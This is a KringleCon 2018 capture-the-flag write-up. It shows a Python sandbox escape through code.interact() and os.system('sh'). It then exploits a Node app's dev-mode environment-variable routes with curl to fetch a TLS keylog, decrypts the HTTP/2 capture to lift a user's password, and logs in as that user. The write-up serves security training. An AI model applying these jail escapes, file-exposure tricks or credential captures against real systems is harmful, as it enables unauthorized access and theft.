## Objective 8

> Santa has introduced a [web-based packet capture and analysis tool](https://packalyzer.kringlecastle.com/) to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? 
> For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.

### Challenge


> I'm another elf in trouble,
> Caught within this Python bubble.

> To complete this challenge, escape Python
> and run ./i_escaped

For this challenge you will need:

- Escaping Python Shell: https://www.youtube.com/watch?v=ZVx2Sxl3B9c
- Mark Baggett Gist: https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499


```
>>> os.system('ls')
Use of the command os.system is prohibited for this question.

>>> import importlib
Use of the command import is prohibited for this question.

>>> exec ('something')
Use of the command exec is prohibited for this question.
```

It's probably "secured" with the blacklist method mentioned in the talk, let's try to reset the blacklist:
```
>>> code.interact()
Python 3.5.2 (default, Nov 12 2018, 13:43:14) 
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> os.system("ls")
NameError: name 'os' is not defined
>>> import os
>>> os.system("ls")
i_escaped
0
```

It worked! So let's break out of the jail:

```
>>> os.system("sh")
$ ls
i_escaped
$ ./i_escaped
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!
```


**Hint**: Chris Davis, HTTP/2: Decryption and Analysis in Wireshark: https://www.youtube.com/watch?v=YHOnxlQ6zec



### Objective completion

Access https://packalyzer.kringlecastle.com/: we don't have an account, so let's register one and log in.

Via this web interface we can sniff traffic, upload PCAPs, dowload archived PCAPs and get a summary of the capture.
Let's start by downloading the current capture (`78535506_3-1-2019_23-37-21.pcap`):

![1_download_pcap.png](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/8/1_download_pcap.png)


The file is a standard tcpdump capture file, the bad news is that all the traffic is https encrypted:

![2_wireshark_first_pcap.png](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/8/2_wireshark_first_pcap.png)

Wireshark could decrypt it:
- with a debug keylog  file, as hinted in the talk
- with the private ssl key

Usually the key is stored on the web server, available to the apache/nginx server or directly to the application (node/flask etc.)

After a look at the structure: 

![packalizer_app_web_files.png](https://github.com/Simone-Zabberoni/kringlecon-2018-report/blob/master/8/packalizer_app_web_files.png)

let's search the code for useful stuff:
- standard js files (ie: jquery) we could ignore
- custom js files: comments, api entry points
- index: additional javascript, comments


The index contains a quite interesting comment:

```
//File upload Function. All extensions and sizes are validated server-side in app.js
```

We're dealing with a node application and we know the main name (`app.js`). If we're lucky, the file could be in one of the html available paths

Browsing https://packalyzer.kringlecastle.com/app.js returns a `Not found`, but https://packalyzer.kringlecastle.com/pub/app.js returns the full backend code! Let's see...


```
#!/usr/bin/node
```
Ok, that's a node application:

```
const log = console.log;
const print = log;
const dev_mode = true;
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
const options = {
  key: fs.readFileSync(__dirname + '/keys/server.key'),
  cert: fs.readFileSync(__dirname + '/keys/server.crt'),
  http2: {
    protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
    protocols: [ 'h2' ],
  },
  keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
};
```
These are interesting constants. 
The application has a developer mode, which is active (`dev_mode = true`). 
The dev mode also enable a `keylog`, whose file name is defined by the environment variable `SSLKEYLOGFILE` and its path is defined by the `DEV` environmental variable.
Node manages directly the private and pub keys, which are under `__dirname + '/keys/'`

Next thing to check, the http route mappings that binds urls to local directories:
```
//Route for anything in the public folder except index, home and register
router.get(env_dirs,  async (ctx, next) => {
try {
    var Session = await sessionizer(ctx);
    //Splits into an array delimited by /
    let split_path = ctx.path.split('/').clean("");
    //Grabs directory which should be first element in array
    let dir = split_path[0].toUpperCase();
    split_path.shift();
    let filename = "/"+split_path.join('/');
    while (filename.indexOf('..') > -1) {
    filename = filename.replace(/\.\./g,'');
    }
    if (!['index.html','home.html','register.html'].includes(filename)) {
    ctx.set('Content-Type',mime.lookup(__dirname+(process.env[dir] || '/pub/')+filename))
    ctx.body = fs.readFileSync(__dirname+(process.env[dir] || '/pub/')+filename)
    } else {
    ctx.status=404;
    ctx.body='Not Found';
    }
} catch (e) {
    ctx.body=e.toString();
}
});

router
.get('/api/:action', async (ctx, next) => {
await api_function(ctx, next)
})
.post('/api/:action', koaBody({ multipart: true }), async (ctx, next) => {
await api_function(ctx, next)
})
```

Basically, we have a route for every item of `env_dirs` and a function that reads the file.

**Important**: take a note of `fs.readFileSync(__dirname+(process.env[dir] || '/pub/')`. 
This means that if we have an environmental variable that matches the name of the requested directory (ie: `private`), read from there instead of reading from `/pub`

**Important**: the  `while (filename.indexOf('..')` bit protects from directory traversal attaccks, so `../../keys/server.key` will not work.

Now, let's search the actual `env_dirs`:

```
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}
```
In default mode the application has routes only for `pub` and `uploads`, but we're in dev mode and the application calls `load_envs()`:

```
function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
```
Ok, we will have a route for every defined environmental variable, and we want to take a closer look at `DEV` and `SSLKEYLOGFILE`:

```
# curl https://packalyzer.kringlecastle.com/DEV/
Error: EISDIR: illegal operation on a directory, read
```
Cool, the `DEV` directory exists, the error is caused by `fs.readFileSync` and correctly states that we can't read a directory as a file.

Let's check `SSLKEYLOGFILE`:

```
# curl https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/
```
We know now the filename of the `keylog`. The missing `/` in the path is caused by the environmental variable expansion and the route path creation.
But, back to the constants, the keylog file name is created by concatenation: `__dirname + process.env.DEV + process.env.SSLKEYLOGFILE`, so it must be:

```
curl https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log
CLIENT_RANDOM 22E7ECAE5E39D4F5383BC76DC99AC7CBF3B08B540E6599C341BAD60F1FA9590C FE82674CA5D412F8527EBA5B39A2552186E962800C29BB6F5DE4E0A6D79AB659978D7E3CEB57EF3EFD7580A19762D2CC
CLIENT_RANDOM C31D079BF4F3586DDF3EC5291D790BE3F781692E6E0C71035528097158C253C0 E6AD8F3FC3BEC0728AFBE8A09B340FCD0F896AD76FD578610A1D65E03C5637E150174C12A6F58F0C9C37289E0A6B6829
CLIENT_RANDOM 0575A27B73C7ADA51217D77BB37EC3DD18B7B5AEDE78608C3A1769F6AD1A2CA3 6279C26EFDD081467E47DE618B2632BA2570871CA95659E9446371B661A423049D25B780F108F1919902488D4F83CC4D
CLIENT_RANDOM 3A0D8797B55E4CE128E73CA276C6976E0A7F7127795FEF75EC8A36C2D1C5F758 E0FB86C99C648781661DE07A94427C34F83FCA95DEFB15F90B63B12A2601084DB9DFEC01A32C0DC1836891E3393B3661
CLIENT_RANDOM 27489166DD50BE9EBE6D7F5E4F14E94133FD18A1148BECAC8486F70BFC8257F6 90C5839771596FD2A482CEF5AC0538B5199CBD41575BCA3EA3DAF91B5A24E3B8CEDCCF76D85C57D484278160124DE7F2
[CUT]
```

Good, now back to Packalyzer let's click "sniff traffic" and download the current capture.
We need to instruct wireshark to use the keylog to decrypt the capture, as described [here](https://wiki.wireshark.org/SSL) and [here](https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/): now we can see plain http2 (see `3_wireshark_decrypted_first_pcap.png` and `4_wireshark_decrypted_first_pcap_http2.png`)!

There are a couple useful filters we can apply (`http2`, `http2.data.data` etc) but this is http traffic and `json` is there the "good stuff" flows: in `5_wireshark_decrypted_first_pcap_json.png` we got Alabaster's password!

```
{"username": "alabaster", "password": "Packer-p@re-turntable192"}
```

There are other good json and passwords in here, but Alabaster is our primary target! 
If we login into packalizer with his credential we will find a "super_secret_packet_capture.pcap" (see `6_alabaster_good_stuff.png`) named `upload_2a4a5ae98007cb261119b208bf9369ef.pcap`.

The capture contains a single SMTP session (see `7_alabaster_capture.png`) which contains a message from Holly Evergreen with a base 64 encoded file:

```
220 mail.kringlecastle.com ESMTP Postfix (Ubuntu)
EHLO Mail.kringlecastle.com
250-mail.kringlecastle.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

MAIL FROM:<Holly.evergreen@mail.kringlecastle.com>
250 2.1.0 Ok
RCPT TO:<alabaster.snowball@mail.kringlecastle.com>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Date: Fri, 28 Sep 2018 11:33:17 -0400
To: alabaster.snowball@mail.kringlecastle.com
From: Holly.evergreen@mail.kringlecastle.com
Subject: test Fri, 28 Sep 2018 11:33:17 -0400
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_11181"

------=_MIME_BOUNDARY_000_11181
Content-Type: text/plain

Hey alabaster, 

Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.

------=_MIME_BOUNDARY_000_11181
Content-Type: application/octet-stream
Content-Transfer-Encoding: BASE64
Content-Disposition: attachment

[base64 cut content]
```

Copy/paste the base64 and convert it with:
```
# base64 -d some_base_64.txt > attach_from_Holly_Evergreen.pdf
```

Actually I don't know if this is a pdf, but it's likely. Let's check first:
```
file attach_from_Holly_Evergreen.pdf
attach_from_Holly_Evergreen.pdf: PDF document, version 1.5
```

Read through the pdf and you will discover the name of the song!



**Objective answer**: `Mary Had a Little Lamb`

